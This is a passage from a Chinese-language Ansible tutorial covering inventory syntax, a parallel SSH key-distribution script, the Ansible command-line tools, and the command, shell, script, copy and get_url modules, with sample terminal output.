代理的情况。 ansible_shell_type # 目标系统的 shell 类型。默认情况下，命令的执行使用 \u0026#39;sh\u0026#39; 语法, 可设置为\u0026#39;csh\u0026#39; 或 \u0026#39;fish\u0026#39;。 ansible_python_interpreter # 目标主机的 python 路径，适用于的情况: 系统中有多个 Python, 或者命令路径不是\u0026#34;/usr/bin/python\u0026#34;，比如 \\*BSD, 或者 /usr/bin/python 不是 2.X 版本的Python。之所以不使用 \u0026#34;/usr/bin/env\u0026#34; 机制，因为这要求远程用户的路径设置正确，且要求 \u0026#34;python\u0026#34; 可执行程序名不可为 python 以外的名字(实际有可能名为python26) 范例：主机和组嵌套\nntp.time.org [databases] www.db1.org:2222 www.db2.org [web] www.web1.com www.web2.com [proxy] pro[1:3].test.com pro-db[a:f].test.com # server 组成员：web, proxy [server:children] # children 是内置变量 web proxy 范例：基于用户名和密码连接\n[test] 10.0.0.1 ansible_connection=local #指定本地连接方式，如：ssh localhost 10.0.0.2 ansible_connection=ssh ansible_ssh_port=2222 ansible_ssh_user=user ansible_ssh_password=passwd 10.0.0.3 ansible_ssh_user=test ansible_ssh_password=test [web] web01 ansible_ssh_host=10.0.0.5 # web01 为别名 web02 ansible_ssh_host=10.0.0.6 [web:vars] # vars 是内置变量，这里为 web 组内的成员定义了一个组变量 ansible_ssh_password=test 2.3 Ansible 相关工具 /usr/bin/ansible 主程序，临时命令执行工具 /usr/bin/ansible-doc 查看配置文档，模块功能查看工具,相当于man /usr/bin/ansible-playbook 定制自动化任务，编排剧本工具,相当于脚本 /usr/bin/ansible-pull 远程执行命令的工具 /usr/bin/ansible-vault 文件加密工具 /usr/bin/ansible-console 基于Console界面与用户交互的执行工具 /usr/bin/ansible-galaxy 下载/上传优秀代码或Roles模块的官网平台 利用 ansible 实现管理的主要方式：\nAnsible Ad-Hoc 主要用于命令行执行命令，适合于简单任务 Ansible playbook 主要用于长期规划好的，大型项目场景 ansible 使用前准备：\nansible 大部分工具使用 ssh 协议来进行远程主机管理，因此在使用此工具前需要配置好密钥认证，如果使用密码验证会很麻烦，而且并不安全。\n在首次 ssh 某台主机时，会有一个是否信任主机的提示：\n[root@ansible ~]# ssh localhost The authenticity of host \u0026#39;localhost (::1)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:kFbXYFVk/H+j5h1JTkIf9HAw+zXbWQIHqG03FutZJ3E. ECDSA key fingerprint is MD5:7b:d4:06:49:45:fa:58:b0:cd:de:ef:bc:1e:14:09:f3. Are you sure you want to continue connecting (yes/no)? 可以修改 /etc/ssh/ssh_config的配置来避免该提示：\nStrictHostKeyChecking no 以下准备了一个脚本来实现 ssh 免密登录：\n准备一个清单文件，写入相应的IP\n[root@ansible ~]# cat hosts.txt 10.0.0.1 10.0.0.2 10.0.0.3 脚本内容：\n#!/bin/bash # 需要修改的参数 ################### # 读取主机列表文件 hosts_file=\u0026#34;hosts.txt\u0026#34; # 远程用户名 remote_user=\u0026#34;your_username\u0026#34; # 并发任务数量 concurrency=10 # SSH 密码 export ssh_password=\u0026#34;your_password\u0026#34; ########################## # 颜色定义 RED=\u0026#39;\\033[0;31m\u0026#39; GREEN=\u0026#39;\\033[0;32m\u0026#39; NC=\u0026#39;\\033[0m\u0026#39; # No Color # 打印带颜色的消息 print_message() { local message=\u0026#34;$1\u0026#34; local color=\u0026#34;$2\u0026#34; echo -e \u0026#34;${color}$message${NC}\u0026#34; } # 检查主机列表文件是否存在 if [ ! -f \u0026#34;$hosts_file\u0026#34; ]; then echo -e \u0026#34;\\033[31mHosts file not found: $hosts_file\\033[0m\u0026#34; exit 1 fi # 安装 sshpass rpm -q sshpass \u0026amp;\u0026gt; /dev/null || yum install -y sshpass # 安装 parallel rpm -qi parallel \u0026amp;\u0026gt; /dev/null || yum install -y parallel # 生成 id_rsa 密钥 [ -f /root/.ssh/id_rsa ] || ssh-keygen -f /root/.ssh/id_rsa -P \u0026#39;\u0026#39; # mkfifo 创建命名管道 tempfifo=\u0026#34;/tmp/$$.fifo\u0026#34; mkfifo ${tempfifo} # 关联fifo文件和fd6，使文件描述符为非阻塞式 exec 6\u0026lt;\u0026gt;${tempfifo} rm -f ${tempfifo} # 为文件描述符创建占位信息 for ((i=1;i\u0026lt;=${concurrency};i++)) do { echo \u0026#34;\u0026#34; \u0026gt;\u0026amp;6 } done # 逐行读取主机列表文件并执行任务 while IFS= read -r host; do read -u6 ## read -u6命令执行一次，相当于尝试从fd6中获取一行，如果获取不到，则阻塞获取到了 ## 一行后，fd6就少了一行了，开始处理子进程，子进程放在后台执行 { sshpass -p \u0026#34;$ssh_password\u0026#34; ssh-copy-id -o StrictHostKeyChecking=no \u0026#34;$remote_user@$host\u0026#34; \u0026amp;\u0026gt;/dev/null; exit_code=$? if [ $exit_code -eq 0 ]; then print_message \u0026#34;成功免密主机: $host\u0026#34; \u0026#34;$GREEN\u0026#34; else print_message \u0026#34;失败免密主机: $host\u0026#34; \u0026#34;$RED\u0026#34; fi echo \u0026#34;\u0026#34; \u0026gt;\u0026amp;6 # 完成后再补充一个空值到fd6中，释放一个锁 } \u0026amp; done \u0026lt; \u0026#34;$hosts_file\u0026#34; wait # 关闭fd6管道 exec 6\u0026gt;\u0026amp;- 2.3.1 Ansible-doc 此工具用于显示模块帮助文档，类似 man\n使用格式：\nansible-doc [options] [module...] -l, --list # 列出可用模块 -s, --snippet # 显示指定模块的playbook片段 常用选项：\n# 列出所有模块 ansible-doc -l # 查看指定模块帮助用法 ansible-doc ping # 查看常用playbook选项 ansible-doc -s ping 查看模块相关的插件\n# connection 模块相关组件 ansible-doc -t connection -l # lookup 模块相关组件 ansible-doc -t lookup -l 2.3.2 Ansible 2.3.2.1 Ansible Ad-Hoc Ansible Ad-Hoc 主要就是使用ansible主程序\n通常用来执行一次性任务，不会保存命令执行的信息，常用于测试场景\n2.3.2.2 Ansible 命令用法 格式：\nansible \u0026lt;host-pattern\u0026gt; [-m module_name] [-a args] 常用选项：\n--version\t# 查看 ansible 版本和配置文件路径 -m \u0026lt;module_name\u0026gt;\t# 指定使用的模块，不指定默认为 command -v # 用于 debug，-vv -vvv 可显示更详细命令执行过程的日志 --list-hosts\t# 显示清单文件中的主机列表 -C, --check\t# 模拟执行，并不对目标主机做实际改动，可以用来检查语法 -T, --timeout=TIMEOUT # 指定命令执行超时时间 -k, --ask-pass # 提示输入 ssh 密码，使用密码验证，默认使用 key 验证 -u, --user=USERNAME # 指定 sudo 用户，默认为 root -b, --become # 使用 sudo 机制 --become-user=USERNAME # 指定 sudo 的目标用户，默认为 root -K, --ask-become-pass\t# 提示输入 sudo 密码 -f \u0026lt;forks_num\u0026gt;, --FORKS # 指定并发数 范例：使用 localhost 走本地协议，并不需要密码（包括 sudo 密码）：\n# 以test 用户执行操作， [root@ansible ~]# ansible localhost -m ping -u test localhost | SUCCESS =\u0026gt; { \u0026#34;changed\u0026#34;: false, \u0026#34;ping\u0026#34;: \u0026#34;pong\u0026#34; } # 指定了用户为 test，但并未生效 [root@ansible ~]# ansible localhost -m shell -a \u0026#34;whoami\u0026#34; -u test localhost | CHANGED | rc=0 \u0026gt;\u0026gt; root # 以 test 用户使用 sudo 机制执行命令 [root@ansible ~]# [root@ansible ~]# ansible localhost -m shell -a \u0026#34;whoami\u0026#34; -u test -b -become-user=root localhost | CHANGED | rc=0 \u0026gt;\u0026gt; root 范例：使用 IP连接，可观测到 ansible 的相关特性\n# 本机IP [root@ansible ~]# hostname -I 192.168.0.133 # 将本机IP加入清单文件（localhost不需要显式加入） [root@ansible ~]# grep $(hostname -I) /etc/ansible/hosts 192.168.0.133 # 没有输入密码提示权限不足 [root@ansible ~]# ansible 192.168.0.133 -m shell -a \u0026#34;whoami\u0026#34; -u test 192.168.0.133 | UNREACHABLE! =\u0026gt; { \u0026#34;changed\u0026#34;: false, \u0026#34;msg\u0026#34;: \u0026#34;Failed to connect to the host via ssh: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).\u0026#34;, \u0026#34;unreachable\u0026#34;: true } # 加入 -k 选项输入密码，成功执行 [root@ansible ~]# ansible 192.168.0.133 -m shell -a \u0026#34;whoami\u0026#34; -u test -k SSH password: 192.168.0.133 | CHANGED | rc=0 \u0026gt;\u0026gt; test # sudo 也是同样的情况，不输入密码会报错 [root@ansible ~]# ansible 192.168.0.133 -m shell -a \u0026#34;whoami\u0026#34; -u test -k -b SSH password: 192.168.0.133 | FAILED | rc=-1 \u0026gt;\u0026gt; Missing sudo password # 输入密码后成功执行 [root@ansible ~]# ansible 192.168.0.133 -m shell -a \u0026#34;whoami\u0026#34; -u test -k -b -K SSH password: BECOME password[defaults to SSH password]: 192.168.0.133 | CHANGED | rc=0 \u0026gt;\u0026gt; root 范例：并发执行控制\n# 分别执行一下以下两个命令观察运行效果，可以发现执行的时间基本一致 [root@ansible ~]# ansible localhost -a \u0026#39;sleep 3\u0026#39; -f 1 [root@ansible ~]# ansible localhost -a \u0026#39;sleep 3\u0026#39; -f 10 范例：使用普通用户进行远程管理\n# 在所有控制端和被控制端创建普通账号并修改密码（本次示例为均为192.168.0.133） [root@ansible ~]# useradd test [root@ansible ~]# echo test:test | chpasswd # 添加sudo授权 [root@ansible ~]# visudo # 添加一行 test\tALL=(ALL) ALL # 校验配置无误 [root@ansible ~]# visudo -c /etc/sudoers: parsed OK # 切换到普通用户 [root@ansible ~]# su - test # 生成密钥对 [test@ansible ~]$ ssh-keygen -f ~/.ssh/id_rsa -P \u0026#39; # 将公钥拷贝到目标主机 [test@ansible ~] ssh-copy-id -o \u0026#34;StrictHostKeyChecking=no\u0026#34; test@192.168.0.133 # 验证免密登录成功 [test@ansible ~]$ ssh test@192.168.0.133 Last login: Mon Jun 12 09:50:05 2023 # 使用ansible进行远程控制，提示权限不足 [test@ansible ~]$ ansible 192.168.0.133 -m shell -a \u0026#39;ls /root/\u0026#39; 192.168.0.133 | FAILED | rc=2 \u0026gt;\u0026gt; ls: cannot open directory /root/: Permission deniednon-zero return code # 使用 sudo 提权后执行成功 [test@ansible ~]$ ansible 192.168.0.133 -m shell -a \u0026#39;ls /root/\u0026#39; -b -K BECOME password: 192.168.0.133 | CHANGED | rc=0 \u0026gt;\u0026gt; ansible.cfg 注意： 在上面的示例中，ansible 远控时并未指定远程的用户名，当没有用 -u 指定远程用户名时，默认使用当前的本机用户名进行远程\n[root@ansible ~]# ansible 192.168.0.133 -m shell -a \u0026#39;whoami\u0026#39; 192.168.0.133 | CHANGED | rc=0 \u0026gt;\u0026gt; root [root@ansible ~]# su - test Last login: Mon Jun 12 10:03:04 CST 2023 from 192.168.0.133 on pts/3 [test@ansible ~]$ ansible 192.168.0.133 -m shell -a \u0026#39;whoami\u0026#39; 192.168.0.133 | CHANGED | rc=0 \u0026gt;\u0026gt; test # 通过 -u 显式指明远程用户名 [test@ansible ~]$ ansible 192.168.0.133 -m shell -a \u0026#39;whoami\u0026#39; -u root -k SSH password: 192.168.0.133 | CHANGED | rc=0 \u0026gt;\u0026gt; root ansible Host-pattern\n用于匹配主机清单中的主机\n准备主机清单文件：\n[root@ansible ~]# cat /etc/ansible/hosts 192.168.0.133 [hello] 192.168.0.1 172.31.5.1 [world] 10.0.0.1 172.31.5.1 all : 内置变量，表示所有主机\n[root@ansible ~]# ansible all --list-hosts hosts (4): 192.168.0.133 10.0.0.1 172.31.5.1 192.168.0.1 通配符\n[root@ansible ~]# ansible \u0026#34;*\u0026#34; --list-hosts hosts (4): 192.168.0.133 10.0.0.1 172.31.5.1 192.168.0.1 [root@ansible ~]# ansible \u0026#34;192.168.0.*\u0026#34; --list-hosts hosts (2): 192.168.0.1 192.168.0.133 逻辑或\n[root@ansible ~]# ansible \u0026#34;hello:world\u0026#34; --list-hosts hosts (3): 192.168.0.1 172.31.5.1 10.0.0.1 逻辑与\n[root@ansible ~]# ansible \u0026#34;hello:\u0026amp;world\u0026#34; --list-hosts hosts (1): 172.31.5.1 逻辑非\n# 引用!号时,不要用双引号,而使用单引号 # 在Ansible中，单引号用于指定字面值模式，以确保其中的内容被视为普通字符，而不进行变量展开或转义字符处理。 [root@ansible ~]# ansible \u0026#39;all:!hello:!world\u0026#39; --list-hosts hosts (1): 192.168.0.133 正则表达式\nansible \u0026#34;~(web|db).*\\.test\\.com\u0026#34; -m ping \u0026quot;~(web|db).*\\.test\\.com\u0026quot;是用于选择目标主机的模式（pattern）。让我们逐步解释这个模式：\n~是Ansible中用于匹配正则表达式的运算符。 (web|db)表示选择以\u0026quot;web\u0026quot;或\u0026quot;db\u0026quot;开头的字符串。在这种情况下，模式将匹配\u0026quot;web\u0026quot;或\u0026quot;db\u0026quot;之后的任意字符。 .*表示匹配零个或多个任意字符。 \\.test\\.com表示匹配字符串\u0026quot;.test.com\u0026quot;。 因此，整个模式~(web|db).*\\.test\\.com将匹配以\u0026quot;web\u0026quot;或\u0026quot;db\u0026quot;开头，然后是任意字符（零个或多个），最后以\u0026quot;.test.com\u0026quot;结尾的字符串。\n使用该模式，ansible命令将选择符合该模式的远程主机，并对它们执行Ping操作。Ping操作旨在检查与目标主机的连通性，并确定是否可以与之通信。\n综上所述，ansible \u0026quot;~(web|db).*\\.test\\.com\u0026quot; -m ping命令将使用Ansible选择以\u0026quot;web\u0026quot;或\u0026quot;db\u0026quot;开头，然后是任意字符，最后以\u0026quot;.test.com\u0026quot;结尾的主机，并对它们执行Ping操作。\n2.3.2.3 Ansible 命令执行过程 加载配置文件，默认为 /etc/ansible/ansible.cfg 匹配主机清单中对应的主机或者主机组 加载对应的模块文件，如：shell 通过 ansible 将模块或命令生成临时 py 文件，并将该文件传输至受控节点：$HOME/.ansible/tmp/ansible-tmp-数字/XXX.PY文件 赋予 xxx.py 文件执行权限：+x 执行并返回结果 删除 xxx.py 文件，结束 2.3.2.4 Ansible 命令执行状态 每种状态对应了一个颜色标识\n[root@ansible ~]# grep -A 14 \u0026#39;\\[colors\\]\u0026#39; /etc/ansible/ansible.cfg [colors] #highlight = white #verbose = blue #warn = bright purple #error = red #debug = dark gray #deprecate = purple #skip = cyan #unreachable = red #ok = green #changed = yellow #diff_add = green #diff_remove = red #diff_lines = cyan 常见的三种颜色标识：\n绿色：表示任务成功完成。当任务在远程主机上成功执行并返回正确的结果时，该任务将以绿色显示。\n黄色： 表示任务已更改。当任务在远程主机上执行并导致一些更改时，但不会破坏系统或引发错误时，该任务将以黄色显示。例如，如果某个配置文件的某行已更改，但该更改不会导致问题或错误，任务状态将显示为黄色。\n红色： 表示任务失败。当任务在远程主机上执行时发生错误或返回错误结果时，该任务将以红色显示。这可能是由于连接问题、权限问题、语法错误或其他原因导致的失败。\n2.3.3 ansible-console 此工具主要用于交互式执行命令，支持命令补全，ansible 2.0+ 版本新增\n提示符格式：\n远程用户@目标主机组（组中的主机数量）[f:并发数]$ 常用命令：\n设置并发数：forks 切换组：cd [group_name]\n查看当前组中的主机：list\n查看所有的内置命令：？或 help\n退出：exit 或者 Ctrl+ D\n示例：\n[root@ansible ~]# ansible-console Welcome to the ansible console. Type help or ? to list commands. root@all (4)[f:5]$ forks 6 root@all (4)[f:6]$ cd hello root@hello (2)[f:6]$ exit 2.3.4 ansible-playbook 此工具主要用于执行编写好的 playbook 任务\n范例：\n[root@ansible playbooks]# cat hello.yaml # playbook 任务，打印 hello world - hosts: localhost remote_user: root gather_facts: no tasks: - name: hello world shell: wall \u0026#34;hello world\u0026#34; # 向所有已登录用户广播消息 [root@ansible playbooks]# ansible-playbook hello.yaml # 执行 playbook 任务 PLAY [localhost] *************************************************************************************************************************************** TASK [hello world] ************************************************************************************************************************************* Broadcast message from root@ansible.localdomain (Mon Jun 19 09:15:36 2023): hello world changed: [localhost] PLAY RECAP ********************************************************************************************************************************************* localhost : ok=1 changed=1 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 2.3.5 ansible-vault 此工具用于加密，解密 yaml 文件\n格式：\nansible-vault [create,decrypt,edit,view,encrypt,encrypt_string,rekey] \u0026lt;*.yaml\u0026gt; 范例：\n[root@ansible playbooks]# ansible-vault encrypt hello.yaml # 加密文件 New Vault password: Confirm New Vault password: Encryption successful [root@ansible playbooks]# ansible-vault view hello.yaml # 查看加密文件内容，需要输入正确的密码 Vault password: - hosts: localhost remote_user: root gather_facts: no tasks: - name: hello world shell: wall \u0026#34;hello world\u0026#34; [root@ansible playbooks]# cat hello.yaml # 正常查看，只能看到密文 $ANSIBLE_VAULT;1.1;AES256 62623561653235343235613763393365396164323430366161363731646339303965316136333964 6662366334363161363465636630646532616334666538640a383037313035646537613264306130 62323438653861613736336339353037373537633066396566366136373832666332636364336362 6130363834346566630a343765303630616631643436373036353966356663366537343863653535 65653565653765363961313738386266336538353336376664643330316633303636333337336237 35653162313461383436643237623034363436373430363237346334663062306638386566313738 36346165643437643230396664346564383039623434346332313961303331383331313761663939 63313665306463356433393731663965366131353336666135343530613062306433623234623666 39633764623862353238613139333264343735303330626432363831646331653666313361316565 3034363863323531393761316363626263653838313734343134 [root@ansible playbooks]# ansible-playbook hello.yaml # 不能直接执行已加密的 playbook ERROR! Attempting to decrypt but no vault secrets found [root@ansible playbooks]# ansible-playbook --ask-vault-pass hello.yaml # 加入选项，输入密码后执行 [root@ansible playbooks]# cat pass.txt # 准备密码文件，存放密码 dd [root@ansible playbooks]# ansible-playbook --vault-password-file pass.txt hello.yaml # 从文件中读取密码 [root@ansible playbooks]# grep vault_password_file /etc/ansible/ansible.cfg # 修改配置文件中的该项，指定密码文件路径 vault_password_file = /etc/ansible/pass.txt [root@ansible playbooks]# ansible-playbook hello.yaml # 可以正常执行 playbook [root@ansible playbooks]# ansible-vault edit hello.yaml # 编辑加密文件，需要输入正确的密码 Vault password: [root@ansible playbooks]# ansible-vault decrypt hello.yaml # 解密文件 Vault password: Decryption successful [root@ansible playbooks]# cat hello.yaml # 可以看到未加密的原文 - hosts: localhost remote_user: root gather_facts: no tasks: - name: hello world shell: wall \u0026#34;hello world +++\u0026#34; [root@ansible playbooks]# ansible-vault create new.yaml # 可以直接创建一个加密文件 New Vault password: Confirm New Vault password: [root@ansible playbooks]# ansible-vault rekey new.yaml # 输入旧密码后，可以更改密码 Vault password: New Vault password: Confirm New Vault password: Rekey successful 2.3.6 ansible-galaxy Galaxy 是一个免费网站, 类似于github网站, 网站上发布了很多的共享的roles角色。\nAnsible 提供了ansible-galaxy命令行工具连接 https://galaxy.ansible.com 网站下载相应的roles，进行\ninit (初始化)、search ( 查拘)、install (安装)、 remove(移除)等操作。\nansible-galaxy是一个与Ansible配置管理工具相关的命令行工具。它用于管理和扩展Ansible角色和集合。\n使用ansible-galaxy，可以执行以下操作：\n安装角色和集合：可以使用ansible-galaxy install命令安装其他人编写的Ansible角色或集合。例如，要安装一个名为myrole的角色，可以运行以下命令（默认下载到~/.ansible/roles下）：\nansible-galaxy install myrole 创建角色：使用ansible-galaxy init命令可以创建一个新的Ansible角色结构。该命令将生成一个包含目录和文件的目录结构，用于组织角色的任务、变量、模板等内容。例如，要创建一个名为myrole的角色，可以运行以下命令：\nansible-galaxy init myrole 列出已安装的角色和集合：使用ansible-galaxy list命令可以列出已经安装在系统上的角色和集合。这将显示已安装的角色和集合的名称、版本号和其他详细信息。\n删除角色和集合：可以使用ansible-galaxy remove命令从系统中删除已安装的角色和集合。例如，要删除一个名为myrole的角色，可以运行以下命令：\nansible-galaxy remove myrole 这些只是ansible-galaxy命令的一些常见用法示例。有关更多详细信息和选项，请查阅Ansible官方文档或运行ansible-galaxy --help命令来获取帮助。\n2.4 Ansible 常用模块 2015年12月只270多个模块\n2016年12年26日ansible 1.9.2 有540个模块\n2018年01月12日ansible 2.3.8 有1378个模块\n2018年05月28日ansible 2.5.3 有1562个模块\n2018年07月15日ansible 2.6.3 有1852个模块\n2018年11月19日ansible 2.7.2 有2080个模块\n2020年03月02日ansible 2.9.5 有3387个模块\n2021年12月22日ansible 2.11.8 有6141个模块\n2022年06月04日ansible 2.12.6 有6763个模块\n虽然模块众多，但最常用的模块约30个左右，针对特定业务学习需要的模块即可\n常用模块帮助文档参考：\nModule Index — Ansible Documentation\nAll modules — Ansible Documentation\n本章节内容以此主机清单进行演示，ansible 为管理节点，remote 为受控节点\n[root@ansible ~]# hostname -I 192.168.0.133 [root@ansible ~]# cat /etc/ansible/hosts remote ansible_ssh_host=192.168.0.134 remote2 ansible_ssh_host=192.168.0.135 2.4.1 command 模块 默认模块。在远程主机执行命令，执行命令时不加 -m 则默认使用此模块\n此命令不支持 \u0026lt;, \u0026gt;, |, ; and \u0026amp; 等高级特性或运算符\n此模块不具备幂等性\n常用选项：\nchdir=DIR\t# 切换目录 creates=FILE\t# 当 FILE 不存在时，执行操作 removes=FILE\t# 当 FILE 存在时，执行操作\t范例：\n# 切换目录，查看系统版本 [root@ansible ~]# ansible localhost -a \u0026#39;chdir=/etc cat centos-release\u0026#39; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; CentOS Linux release 7.6.1810 (Core) # 当 /tmp/tmp.txt 存在时，打印 hello [root@ansible ~]# ansible localhost -a \u0026#39;chdir=/etc creates=/tmp/tmp.txt echo hello\u0026#39; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; hello # 当 /tmp/tmp.txt 存在时，打印 hell，这里条件不满足，任务直接被跳过 [root@ansible ~]# ansible localhost -a \u0026#39;chdir=/etc removes=/tmp/tmp.txt echo hello\u0026#39; localhost | SUCCESS | rc=0 \u0026gt;\u0026gt; skipped, since /tmp/tmp.txt does not exist 不支持的高级特性：\n# 创建 hello.txt, 命令执行成功 [root@ansible ~]# ansible localhost -a \u0026#39;chdir=/tmp echo hello \u0026gt; hello.txt\u0026#39; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; hello \u0026gt; hello.txt # 实际上文件并不存在 [root@ansible ~]# ansible localhost -a \u0026#39;chdir=/tmp ll hello.txt\u0026#39; localhost | FAILED | rc=2 \u0026gt;\u0026gt; [Errno 2] No such file or directory [root@ansible ~]# ll /tmp/hello.txt ls: cannot access /tmp/hello.txt: No such file or directory # 不支持 \u0026amp;\u0026amp; ; | 等符号（尽管执行不报错） [root@ansible ~]# ansible localhost -a \u0026#39;chdir=/tmp echo hello \u0026gt; hello.txt \u0026amp;\u0026amp; echo world\u0026#39; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; hello \u0026gt; hello.txt \u0026amp;\u0026amp; echo world [root@ansible ~]# ansible localhost -a \u0026#39;chdir=/tmp echo hello \u0026gt; hello.txt ; echo world\u0026#39; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; hello \u0026gt; hello.txt ; echo world [root@ansible ~]# ansible localhost -m command -a \u0026#34;echo test | passwd --stdin pass\u0026#34; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; test | passwd --stdin pass 2.4.2 shell 模块 此模块功能与 command 几乎一致，但是功能会更强。Command 模块不支持的重定向，管道符等运算符在 Shell 模块中都是支持的（尽管如此，实际使用时尽量避免使用过于复杂或特殊的符号），除非有使用高级特性的需求，否则官方更推荐使用 command 模块（更加安全和稳定）。\n此模块不具备幂等性\n常见选项\nchdir=DIR\t# 切换目录 creates=FILE\t# 当 FILE 不存在时，执行操作 removes=FILE\t# 当 FILE 存在时，执行操作 范例：\n# 打印变量 [root@ansible ~]# ansible localhost -m shell -a \u0026#34;echo $HOSTNAME\u0026#34; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; localhost.localdomain # 修改账号密码 [root@ansible ~]# ansible localhost -m shell -a \u0026#34;echo pass | passwd --stdin test\u0026#34; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; Changing password for user test. passwd: all authentication tokens updated successfully. # 使用重定向生成文件，并输出内容 [root@ansible ~]# ansible localhost -m shell -a \u0026#34;echo hello \u0026gt; /tmp/hello.txt \u0026amp;\u0026amp; ls /tmp/hello.txt \u0026amp;\u0026amp; cat /tmp/hello.txt\u0026#34; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; /tmp/hello.txt hello 注意：类似 cat /tmp/test.md | awk -F\u0026rsquo;|\u0026rsquo; \u0026lsquo;{print $1,$2}\u0026rsquo; \u0026amp;\u0026gt; /tmp/example.txt 的复杂命令，即使使用Shell模块也可能会失败。可以考虑将命令写成 shell 脚本，再通过 Script 模块进行调用\nAnsible 命令所使用的默认模块是 command，可以通过修改配置项重新指定为别的模块：\n[root@ansible ~]# grep module_name /etc/ansible/ansible.cfg #module_name = command 2.4.3 script 模块 此模块可以在远程主机执行 Ansible 主机上的脚本（脚本不需要执行权限）\n此模块不具备幂等性\n常见选项\nchdir=DIR\t# 切换目录 creates=FILE\t# 当 FILE 不存在时，执行操作 removes=FILE\t# 当 FILE 存在时，执行操作\t范例：\n# 准备一个脚本文件 [root@ansible ~]# cat test.sh echo hello # 该文件无执行权限 [root@ansible ~]# ll test.sh -rw-r--r--. 1 root root 11 Jun 20 15:44 test.sh # 通过 script模块 在目标主机执行该脚本 [root@ansible ~]# ansible remote -m script -a \u0026#39;test.sh\u0026#39; remote | CHANGED =\u0026gt; { \u0026#34;changed\u0026#34;: true, \u0026#34;rc\u0026#34;: 0, \u0026#34;stderr\u0026#34;: \u0026#34;Shared connection to 192.168.0.134 closed.\\r\\n\u0026#34;, \u0026#34;stderr_lines\u0026#34;: [ \u0026#34;Shared connection to 192.168.0.134 closed.\u0026#34; ], \u0026#34;stdout\u0026#34;: \u0026#34;hello\\r\\n\u0026#34;, \u0026#34;stdout_lines\u0026#34;: [ \u0026#34;hello\u0026#34; ] } 2.4.4 copy 模块 此模块用于文件拷贝，有两种用法：\n将 ansible 主机上的文件拷贝到受控节点 将受控节点的文件拷贝到受控节点的其他路径 常见选项\nsrc # 控制端的源文件路径 dest # 被控端的文件路径 owner # 属主 group # 属组 mode # 权限 backup # 是否备份 validate # 验证成功才会执行copy remote_src # no 是默认值, 表示 src 文件在 ansible 主机, yes表示 src 文件在远程主机 范例：\n# 创建local.txt 并将其拷贝到 remote 主机上 [root@ansible ~]# touch local.txt [root@ansible ~]# ansible remote -m copy -a \u0026#39;src=local.txt dest=/tmp/remote.txt owner=test mode=600\u0026#39; # 成功拷贝到 remote 主机 [root@ansible ~]# ansible remote -a \u0026#39;ls /tmp/remote.txt\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; /tmp/remote.txt # 修改local.txt 文件内容，再次执行拷贝操作 [root@ansible ~]# echo hello \u0026gt;\u0026gt; local.txt # 当文件内容变化，且 backup=yes 时，会在拷贝操作执行前，在目标主机生成一个以时间戳为后缀的备份文件，如：remote.txt.9235.2023-06-20@16:52:58~ [root@ansible ~]# ansible remote -a \u0026#34;ls /tmp\u0026#34; remote | CHANGED | rc=0 \u0026gt;\u0026gt; ansible_command_payload_QQiJzZ remote.txt remote.txt.9235.2023-06-20@16:52:58~ # 拷贝 remote 主机的文件到指定路径，remote_src 表示源文件在目标主机上 [root@ansible ~]# ansible remote -m copy -a \u0026#34;src=/tmp/remote.txt dest=/tmp/local.txt owner=test mode=600 remote_src=yes\u0026#34; # 成功在 remote 主机的 /tmp 目录下 复制了一个 local.txt 文件 [root@ansible ~]# ansible remote -a \u0026#34;ls /tmp/local.txt\u0026#34; remote | CHANGED | rc=0 \u0026gt;\u0026gt; /tmp/local.txt # 直接指定文件内容，生成文件 [root@ansible ~]# ansible remote -m copy -a \u0026#39;content=\u0026#34;hello\\nworld\\n\u0026#34; dest=/tmp/hello.txt\u0026#39; [root@ansible ~]# ansible remote -a \u0026#39;cat /tmp/hello.txt\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; hello world #### 拷贝整个文件夹 /tmp 到 remote 主机。注意：是 /tmp 而非 /tmp/ [root@ansible ~]# ansible remote -m copy -a \u0026#39;src=/tmp dest=/tmp/\u0026#39; [root@ansible ~]# ansible remote -a \u0026#39;ls -d /tmp/tmp\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; /tmp/tmp ### 拷贝/tmp 文件夹下的文件到目标主机 # 提前在目标主机新建一个空文件夹用于存放 /tmp 目录下的文件 [root@remote ~]# ls -d /test/ /test/ # 在 /tmp 文件夹下有一个 test.txt 文件 [root@ansible ~]# ls /tmp/test.txt /tmp/test.txt # 执行拷贝操作，观察到成功拷贝 /tmp 文件夹下的文件到目标主机 [root@ansible ~]# ansible remote -m copy -a \u0026#39;src=/tmp/ dest=/test\u0026#39; [root@ansible ~]# ansible remote -a \u0026#39;ls /test\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; test.txt # 复制文件并执行校验命令，注意：%s 是一个占位符，将在命令执行时被替换为源文件的路径。 [root@ansible ~]# ansible remote -m copy -a \u0026#34;src=/etc/sudoers dest=/etc/sudoers.bak remote_src=yes validate=\u0026#39;/usr/sbin/visudo -csf %s\u0026#39;\u0026#34; 2.4.5 get_url 模块 此模块使用 http、https 或 ftp 协议下载文件\n常用参数：\nurl # 下载文件的URL,支持 HTTP，HTTPS 或 FTP 协议 dest # 下载到目标路径（绝对路径），如果目标是一个目录，就用原文件名，如果目标设置了名称就用目标设置的名称 owner # 指定属主 group # 指定属组 mode # 指定权限 force # 如果 yes，dest 不是目录，将每次下载文件，如果内容改变替换文件。如果 no，则只有在目标不存在时才会下载，默认：no checksum # 对目标文件在下载后计算摘要，以确保其完整性 # 示例: # checksum=\u0026#34;sha256:D98291AC[...]B6DC7B97\u0026#34;, # checksum=\u0026#34;sha256:http://example.com/path/sha256sum.txt\u0026#34; url_username # 用于HTTP基本认证的用户名。 对于允许空密码的站点，此参数可以不使用 `url_password\u0026#39; url_password # 用于HTTP基本认证的密码。 如果未指定`url_username\u0026#39;参数，则不生效 `url_password\u0026#39;参数 validate_certs # 如果“no”，SSL证书将不会被验证。 适用于自签名证书在私有网站上使用 timeout # URL请求的超时时间,秒为单位 范例：\n# 下载 